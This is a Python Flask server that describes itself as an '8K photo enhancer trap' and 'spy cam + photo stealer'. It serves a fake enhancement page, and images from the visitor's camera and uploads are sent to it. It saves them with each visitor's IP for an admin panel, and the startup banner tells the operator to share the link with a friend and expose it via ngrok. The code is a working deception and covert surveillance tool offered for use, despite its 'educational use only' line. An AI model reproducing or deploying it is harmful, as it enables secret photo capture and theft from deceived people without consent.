#!/usr/bin/env python3
"""
📸 8K PHOTO ENHANCER TRAP — SPY CAM + PHOTO STEALER
👑 CREATED BY: MOHSIN
😂 DOST KO TANG KARNE KA BEST TARIQA!
"""

from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from datetime import datetime
import os
import base64
import json
import threading
import time
from pathlib import Path
from PIL import Image
import io

# ===== COLORS =====
try:
    from colorama import init, Fore
    init(autoreset=True)
    G = Fore.GREEN; R = Fore.RED; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.RESET
except:
    G = R = Y = C = W = ""

# ===== CONFIG =====
ADMIN_PASSWORD = "mohsin123"
CAPTURE_INTERVAL = 3
MAX_PHOTOS = 100

# ===== FLASK SETUP =====
app = Flask(__name__)
app.config['SECRET_KEY'] = 'mohsin_secret_key_2024'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# ===== FOLDERS =====
BASE_DIR = Path(__file__).parent
CAPTURED_DIR = BASE_DIR / "captured"
UPLOADED_DIR = BASE_DIR / "uploaded"
CAPTURED_DIR.mkdir(exist_ok=True)
UPLOADED_DIR.mkdir(exist_ok=True)

# ===== DATA STORE =====
captured_photos = []
connected_clients = {}

# ===== ROUTES =====

@app.route('/')
def index():
    """Fake 8K Enhancer Page"""
    return render_template('index.html')

@app.route('/admin')
def admin():
    """Admin Panel"""
    return render_template('admin.html', password=ADMIN_PASSWORD)

@app.route('/api/upload-photo', methods=['POST'])
def upload_photo():
    """Receive uploaded photo"""
    try:
        data = request.json
        image_data = data.get('image', '')
        
        if image_data and 'base64' in image_data:
            image_data = image_data.split('base64,')[-1]
            
            filename = f"upload_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{random.randint(100,999)}.png"
            filepath = UPLOADED_DIR / filename
            
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(image_data))
            
            photo_info = {
                'filename': filename,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'type': 'uploaded',
                'size': os.path.getsize(filepath)
            }
            captured_photos.append(photo_info)
            
            socketio.emit('new_photo', photo_info)
            
            return jsonify({'success': True, 'message': 'Photo received!'})
        
        return jsonify({'success': False, 'message': 'No image data'})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/capture-camera', methods=['POST'])
def capture_camera():
    """Receive camera capture"""
    try:
        data = request.json
        image_data = data.get('image', '')
        
        if image_data and 'base64' in image_data:
            image_data = image_data.split('base64,')[-1]
            
            filename = f"camera_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{random.randint(100,999)}.png"
            filepath = CAPTURED_DIR / filename
            
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(image_data))
            
            photo_info = {
                'filename': filename,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'type': 'camera',
                'size': os.path.getsize(filepath)
            }
            captured_photos.append(photo_info)
            
            if len(captured_photos) > MAX_PHOTOS:
                old_photo = captured_photos.pop(0)
                old_file = CAPTURED_DIR / old_photo['filename']
                if old_file.exists():
                    old_file.unlink()
            
            socketio.emit('new_photo', photo_info)
            
            return jsonify({'success': True})
        
        return jsonify({'success': False})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/get-photos', methods=['POST'])
def get_photos():
    """Get all captured photos (admin)"""
    data = request.json
    password = data.get('password', '')
    
    if password == ADMIN_PASSWORD:
        return jsonify({
            'success': True,
            'photos': captured_photos[::-1]
        })
    
    return jsonify({'success': False, 'message': 'Wrong password!'})

@app.route('/api/delete-photo', methods=['POST'])
def delete_photo():
    """Delete a photo (admin)"""
    global captured_photos
    data = request.json
    filename = data.get('filename', '')
    
    captured_photos = [p for p in captured_photos if p['filename'] != filename]
    
    filepath = CAPTURED_DIR / filename
    if not filepath.exists():
        filepath = UPLOADED_DIR / filename
    
    if filepath.exists():
        filepath.unlink()
    
    return jsonify({'success': True})
@app.route('/api/delete-all', methods=['POST'])
def delete_all():
    """Delete all photos (admin)"""
    global captured_photos
    captured_photos.clear()
    
    for f in CAPTURED_DIR.glob('*'):
        f.unlink()
    for f in UPLOADED_DIR.glob('*'):
        f.unlink()
    
    return jsonify({'success': True})

@app.route('/api/photo/<filename>')
def serve_photo(filename):
    """Serve captured photo"""
    for directory in [CAPTURED_DIR, UPLOADED_DIR]:
        filepath = directory / filename
        if filepath.exists():
            return send_from_directory(directory, filename)
    
    return "Not found", 404

@app.route('/api/stats')
def get_stats():
    """Get statistics"""
    camera_count = len([p for p in captured_photos if p['type'] == 'camera'])
    upload_count = len([p for p in captured_photos if p['type'] == 'uploaded'])
    
    return jsonify({
        'total_photos': len(captured_photos),
        'camera_captures': camera_count,
        'uploaded_photos': upload_count,
        'connected_clients': len(connected_clients),
        'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
@app.route('/api/get-all-photos')
def get_all_photos():
    """Get all photos without password (for admin panel)"""
    return jsonify({
        'success': True,
        'photos': captured_photos[::-1]  # Newest first
    })    

# ===== WEBSOCKET EVENTS =====

@socketio.on('connect')
def handle_connect():
    """Client connected"""
    client_ip = request.remote_addr
    connected_clients[request.sid] = {
        'ip': client_ip,
        'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    
    print(f"\n{G}[+] Client connected: {client_ip}{W}")

@socketio.on('disconnect')
def handle_disconnect():
    """Client disconnected"""
    if request.sid in connected_clients:
        client = connected_clients.pop(request.sid)
        print(f"\n{R}[-] Client disconnected: {client['ip']}{W}")

@socketio.on('start_camera')
def handle_start_camera():
    """Client started camera"""
    if request.sid in connected_clients:
        print(f"\n{G}[📸] Camera started by: {connected_clients[request.sid]['ip']}{W}")

@socketio.on('log')
def handle_log(data):
    """Client log event"""
    event = data.get('event', 'unknown')
    details = data.get('details', '')
    print(f"  {C}[LOG] {event}: {details[:80]}{W}")

# ===== ERROR HANDLERS =====

@app.errorhandler(404)
def not_found(e):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({'error': 'Server error'}), 500

# ===== MAIN =====
if __name__ == '__main__':
    import random
    
    print(f"""
{C}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║     📸  8K PHOTO ENHANCER TRAP — SPY CAM SERVER  📸                 ║
║     👑  CREATED BY: MOHSIN  👑                                     ║
║     😂  DOST KO TANG KARNE KA BEST TARIQA!  😂                     ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{W}""")
    
    print(f"\n  {G}[✓] Server starting...{W}")
    print(f"  {C}📸 Trap Page: {G}http://localhost:5000{W}")
    print(f"  {C}🔐 Admin Panel: {G}http://localhost:5000/admin{W}")
    print(f"  {C}🔑 Admin Password: {G}{ADMIN_PASSWORD}{W}")
    print(f"\n  {Y}[*] Share the trap page link with your friend!{W}")
    print(f"  {Y}[*] Use NGROK to make it public: ngrok http 5000{W}")
    print(f"\n  {R}⚠️  FOR EDUCATIONAL USE ONLY!{W}\n")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
